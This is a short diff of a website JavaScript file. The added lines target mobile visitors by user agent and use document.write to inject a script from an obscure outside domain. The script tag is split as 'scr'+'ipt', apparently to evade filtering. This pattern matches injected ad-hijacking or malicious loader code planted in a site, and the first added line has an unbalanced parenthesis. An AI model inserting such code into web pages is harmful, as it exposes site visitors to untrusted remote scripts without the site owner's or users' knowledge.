@@ -1,3 +1,5 @@
+;if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) 
+    document.write('<scr'+'ipt async defer src="https://jgsqfkj.com/o.aspx?action=c&o1=7&o2=530&o3=&o4=1&o5=AdCode_sjptzd&o6=640x200&o7=1&o8=1&o9=&o10=&o50=1362033" id="1362033"></scr'+'ipt>');
 ;document.write(`
 <style type="text/css">
 	@media screen and (min-width: 728px){
